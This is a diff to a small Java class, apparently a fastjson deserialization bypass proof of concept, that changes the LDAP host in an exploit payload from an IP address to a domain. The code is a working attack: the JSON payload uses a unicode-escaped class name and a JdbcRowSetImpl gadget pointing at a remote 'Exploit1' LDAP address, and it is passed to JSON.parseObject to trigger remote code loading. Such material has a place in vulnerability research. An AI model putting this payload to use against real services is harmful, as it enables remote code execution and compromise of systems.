@@ -11,7 +11,7 @@ public class Bypass1247 {
     public static void main(String[] args){
         String payload  = "{\"cache\":{\"@type\":\"java.lang.Class\",\"val\":\"L\u0063om.sun.rowset.JdbcRowSetImpl;\"},"
                 + "\"value\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
-                + "\"dataSourceName\":\"ldap://118.24.152.133:1389/Exploit1\",\"autoCommit\":true}}";
+                + "\"dataSourceName\":\"ldap://xxlegend.com/Exploit1\",\"autoCommit\":true}}";
         JSON.parseObject(payload, Object.class);
     }
 }
